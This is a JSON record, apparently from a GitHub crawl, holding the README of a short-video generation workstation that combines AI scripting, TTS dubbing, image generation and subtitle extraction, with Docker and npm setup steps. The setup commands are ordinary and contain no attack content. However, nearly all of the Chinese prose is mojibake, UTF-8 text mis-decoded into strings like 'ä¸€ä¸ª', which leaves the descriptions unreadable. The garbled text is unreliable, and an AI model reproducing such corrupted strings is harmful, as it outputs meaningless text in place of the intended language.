      "readme": "# Video Material GEN Workstation\n\nä¸€ä¸ªé›†å†…å®¹ç­–åˆ’ã€AIæ–‡æ¡ˆè‡ªåŠ¨ç”Ÿæˆã€TTS æ‰¹é‡è‡ªåŠ¨é…éŸ³ã€(AI)å›¾ç‰‡ç´ æåˆæˆã€ASRè‡ªåŠ¨æå–è¯­è¨€å­—å¹•è„šæœ¬ã€AIè‡ªç”±åˆ›ä½œäºä¸€ä½“çš„(çŸ­è§†é¢‘)ç”Ÿæˆå·¥ä½œç«™ã€‚æ–¹ä¾¿ç®¡ç†æ¯æœŸçš„è§†é¢‘é¡¹ç›®ã€‚\n\n# â—æ­£åœ¨è€ƒè™‘ä½¿ç”¨æœ€æ–°LangGraphæ¶æ„é‡æ„è¯¥é¡¹ç›®ï¼Œæ•¬è¯·æœŸå¾…â—\n\n## åŠŸèƒ½é€Ÿè§ˆ\n\n- æ”¯æŒæŒ‰æ¨¡æ¿æ‰¹é‡ç”Ÿæˆè§†é¢‘é¡¹ç›®ï¼Œè„šæœ¬ã€å›¾ç‰‡ç´ æ(AI)ã€å­—å¹•å’ŒéŸ³é¢‘ä¸€é”®é½å¤‡ã€‚\n- Gemini + TTSåˆæˆï¼Œæ—¢èƒ½æ”¹å†™è„šæœ¬åˆèƒ½ç›´æ¥è¾“å‡º(å¸¦æƒ…ç»ªçš„)é…éŸ³ã€‚\n- å›¾æ–‡åˆ†è½¨ç®¡ç†ï¼Œå¯åœ¨å‰ç«¯éšæ—¶æ›¿æ¢å›¾ç‰‡ã€å­—å¹•æˆ–éŸ³é¢‘å¹¶é¢„è§ˆç»“æœã€‚\n\n## æ•°æ®å±•ç¤º\n\n![æŠ–éŸ³æŠ•æ”¾æ•°æ®](img/æ•°æ®.png)\n\n\n## å‰ç«¯ç•Œé¢\n\n![ç•Œé¢ 1](img/1.png)\n![ç•Œé¢ 2](img/2.png)\n![ç•Œé¢ 3](img/3.png)\n![ç•Œé¢ 4](img/4.png)\n![ç•Œé¢ 5](img/5.png)\n![ç•Œé¢ 6](img/6.png)\n\n## é€šè¿‡Docker éƒ¨ç½²(ç›®å‰æœ‰Bug)\n\n1. å¤åˆ¶é…ç½®ï¼š`cp env.example.yaml env.yaml`ï¼Œå¡«å¥½å„ä¸ª Keyã€‚å®¹å™¨å†…å»ºè®®æŠŠ `Default-Project-Root` è®¾ä¸º `/data/projects`ï¼ˆä¼šè¢«æ˜ å°„åˆ°æœ¬åœ° `./data` ç›®å½•ï¼Œæ–¹ä¾¿æŒä¹…åŒ–ï¼‰ã€‚\n2. ä¸€é”®å¯åŠ¨ï¼š`docker compose up -d --build`ã€‚é¦–æ¬¡ä¼šè‡ªåŠ¨æ„å»ºã€‚\n3. æ‰“å¼€ `http://localhost:8765` ä½¿ç”¨ã€‚æŸ¥çœ‹æ—¥å¿—å¯ç”¨ `docker compose logs -f video-workstation`ã€‚\n4. å®¹å™¨æ˜¯æ— æ¡Œé¢ç¯å¢ƒï¼Œâ€œæ‰“å¼€é¡¹ç›®ç›®å½•/æ‰“å¼€TTSæ–‡ä»¶å¤¹â€ç­‰æŒ‰é’®ä¸ä¼šå¼¹å‡ºæ–‡ä»¶ç®¡ç†å™¨ï¼Œæ¥å£ä¼šç›´æ¥è¿”å›è·¯å¾„ï¼›è¯·åœ¨å®¿ä¸»æœºæ‰‹åŠ¨è¿›å…¥å¯¹åº”ç›®å½•ï¼ˆé»˜è®¤æŒ‚è½½åœ¨å½“å‰ä»“åº“çš„ `./data`ï¼‰ã€‚\n\n> nodeå¦‚æœæ‹‰ä¸ä¸‹æ¥ï¼Œæ¨èå…ˆä½¿ç”¨ `docker pull node:20-alpine` , å†è¿è¡Œ `docker compose up -d --build` \n\nå¦‚æœä¸æƒ³ç”¨ Composeï¼Œä¹Ÿå¯ä»¥ç”¨å•æ¡å‘½ä»¤è¿è¡Œé•œåƒï¼ˆéœ€è¦å…ˆ `docker build -t video-workstation .`ï¼‰ï¼š\n`docker run -d -p 8765:8765 -v $(pwd)/env.yaml:/app/env.yaml:ro -v $(pwd)/data:/data --name video-workstation video-workstation`\n\n## é€šè¿‡æºç éƒ¨ç½²\n\n1. å¤åˆ¶ `env.example.yaml` ä¸º `env.yaml`ï¼Œå¡«å…¥è‡ªå·±çš„ Gemini Keyã€Base URLã€æ¨¡å‹ã€TTS Key ä¸æç¤ºè¯ç­‰é…ç½®ï¼Œå¦åˆ™æ— æ³•è°ƒç”¨æ¥å£ã€‚\n2. ï¼ˆå¯é€‰ï¼‰åœ¨ `env.yaml` ä¸­è®¾ç½® `Default-Project-Root`ï¼Œç”¨äºå­˜æ”¾è‡ªåŠ¨ç”Ÿæˆçš„è„šæœ¬ã€éŸ³é¢‘ä¸å›¾ç‰‡æ–‡ä»¶ã€‚\n3. å®‰è£…ä¾èµ–ï¼š`npm install`ã€‚\n4. å¯åŠ¨æœåŠ¡ï¼š`npm start` æˆ–ç›´æ¥åŒå‡» `start.bat`ï¼Œé»˜è®¤è®¿é—®åœ°å€ä¸º `http://localhost:8765`ã€‚\n\n## åŠŸèƒ½ä»‹ç»\n\n1. **é¡¹ç›®æ€»è§ˆ**ï¼šä»¥å¡ç‰‡å½¢å¼ç®¡ç†æ‰¹é‡é¡¹ç›®ï¼Œæ˜¾ç¤ºè¾“å‡ºç›®å½•ã€åˆ›å»ºæ—¶é—´åŠåˆ é™¤åŠ¨ä½œï¼Œä¾¿äºå¿«é€Ÿå®šä½ã€‚\n2. **æ–‡æ¡ˆç”Ÿæˆ**ï¼šç»“æ„åŒ–å±•ç¤ºåœºæ™¯è„šæœ¬ï¼Œå¯å¤åˆ¶å•æ¡æˆ–æ•´æ®µæ–‡æ¡ˆï¼Œå·¦ä¾§å‹¾é€‰è”åŠ¨å³ä¾§æç¤ºè¯ã€‚\n3. **å­—å¹•è·å–**: éœ€é…åˆæˆ‘çš„å¦ä¸€ä¸ªé¡¹ç›®(n8n-http-tools): å¼€æºåœ°å€:[n8n-http-tools](https://github.com/Norsico/n8n-http-tools)\n4. **TTS åˆæˆ**ï¼šæ”¯æŒå•æ¡ä¸æ‰¹é‡ä¸¤ç§æ¨¡å¼ï¼Œè¾“å…¥åˆæˆæ–‡æœ¬ä¸æƒ…æ„Ÿæç¤ºå³å¯ç”Ÿæˆè¯­éŸ³ã€‚\n5. **å›¾ç‰‡ç”Ÿæˆ**ï¼šé›†ä¸­ç®¡ç†è§’è‰²æè¿°ã€åœºæ™¯æè¿°ç­‰æç¤ºè¯ï¼Œå‹¾é€‰åå³å¯æ‰¹é‡å¤åˆ¶åˆ°ç»˜å›¾ä»»åŠ¡ã€‚\n6. **ç«‹ç»˜/èƒŒæ™¯ç­‰ç”Ÿæˆ**ï¼šæä¾›æç¤ºè¯è¾“å…¥ã€å‚è€ƒå›¾ä¸Šä¼ ã€å®½é«˜æ¯”è®¾ç½®ä¸å†å²è®°å½•ï¼Œæ–¹ä¾¿éšæ—¶å¤ç”¨ç´ æã€‚\n7. **é€†å‘æ¥å£å®ç°ASRè‡ªåŠ¨æå–å‰ªè¾‘éœ€è¦çš„å­—å¹•æ–‡ä»¶**ï¼šåœ¨TTSåˆæˆç•Œé¢ä¸‹æ–¹ï¼Œæœ‰â€œå­—å¹•ç”Ÿæˆâ€åŠŸèƒ½ï¼Œç‚¹å‡»ä¸‹æ–¹çš„æŒ‰é’®å¯ä»¥æ‰“å¼€å­—å¹•ç”Ÿæˆå·¥å…·ã€‚æ­¤éƒ¨åˆ†ä»£ç ç”±å…¶å®ƒä½œè€…å¼€æºã€‚\n8. **å¸¸ç”¨æç¤ºè¯ä¸è‡ªç”±åˆ›ä½œ**ï¼šæ”¶è—é«˜é¢‘æç¤ºè¯å¹¶ä¸€é”®å¤åˆ¶ï¼ŒåŒæ—¶æä¾›è‡ªç”±åˆ›ä½œé¢æ¿è¿›è¡Œè‡ªå®šä¹‰ç»˜åˆ¶ã€‚\n\n### å…¶å®ƒåŠŸèƒ½æˆ‘å°±æ‡’å¾—ä¸€ä¸ªä¸€ä¸ªå†™äº†ï¼Œå…·ä½“æœ‰å•¥è‡ªå·±å¯ä»¥éƒ¨ç½²ä¸€ä¸‹å»ç©ï¼Œæ³¨æ„æ–‡æ¡ˆç”Ÿæˆè¿™é‡Œéœ€è¦é…åˆn8næ¥æ“ä½œï¼Œä¹‹å‰å†™çš„n8næ–‡ä»¶æ‰¾ä¸åˆ°äº†ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†å…¶å®å¯ä»¥å¿½ç•¥ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆæ–‡æ¡ˆçš„è„šæœ¬AIæç¤ºè¯ä»¥åŠæˆ‘ä¸»é¡µå¦ä¸€ä¸ªä»“åº“ä¸­æœ‰çš„ä¸€ä¸ªå¼€æºçš„Bç«™è§†é¢‘å­—å¹•æå–å™¨ï¼ˆå½“ç„¶ç½‘ä¸Šä¹Ÿæœ‰ï¼‰ï¼ˆå‚è€ƒåˆ«äººé«˜æ’­æ”¾çš„è§†é¢‘è‡ªå·±å­¦èµ·æ¥ä¹Ÿä¼šå¿«å¾ˆå¤šï¼‰\n\n## æ¥ä¸‹æ¥å¦‚ä½•å¥½å¥½åˆ©ç”¨è¿™ä¸ªé¡¹ç›®è¿˜æ˜¯å¾—é è‡ªå·±ã€‚\n### å› ä¸ºä¸»è¦è¿˜æ˜¯åå‘ç®¡ç†ç”¨çš„ï¼ˆç®€å•æ¥è®²å°±æ˜¯åŠŸèƒ½ä¸ä¼šæœ‰ä½ æƒ³è±¡çš„é‚£ä¹ˆå®ç”¨ï¼‰ï¼Œè§†é¢‘å†…å®¹å¦‚ä½•å®šä¹‰ï¼Œå¦‚ä½•æ‰“é€ çˆ†æ¬¾è¿˜æ˜¯éœ€è¦åŠ¨è„‘å­ã€‚å½“ç„¶æœ¬é¡¹ç›®é‡Œé¢ä½¿ç”¨å›¾åƒç¼–è¾‘æ¨¡å‹çš„æ˜¯NanoBananaï¼Œæœ¬åœ°éƒ¨ç½²çš„AIStudioçš„åå‘ä»£ç†çš„æ¥å£ï¼Œç”¨æ¥ç”Ÿå›¾ç„¶åç»™Soraä¹Ÿæ˜¯ä¸é”™çš„ï¼Œèµ·ç æµ‹è¯•ä¸‹æ¥æ¯”è¾ƒç¨³å®šã€‚\n\n## Star History\n\n<a href=\"https://www.star-history.com/#Norsico/Video-Materials-AutoGEN-Workstation&type=date&legend=bottom-right\">\n <picture>\n   <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://api.star-history.com/svg?repos=Norsico/Video-Materials-AutoGEN-Workstation&type=date&theme=dark&legend=bottom-right\" />\n   <source media=\"(prefers-color-scheme: light)\" srcset=\"https://api.star-history.com/svg?repos=Norsico/Video-Materials-AutoGEN-Workstation&type=date&legend=bottom-right\" />\n   <img alt=\"Star History Chart\" src=\"https://api.star-history.com/svg?repos=Norsico/Video-Materials-AutoGEN-Workstation&type=date&legend=bottom-right\" />\n </picture>\n</a>\n\n## å…è´£å£°æ˜\n\n### é¡¹ç›®ä»…å…±å‚è€ƒäº¤æµå­¦ä¹ ä½¿ç”¨ï¼Œä¸å¯¹ä»»ä½•ä½¿ç”¨è€…äº§ç”Ÿçš„é—®é¢˜è´Ÿè´£\n\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:41.292300"
  }
]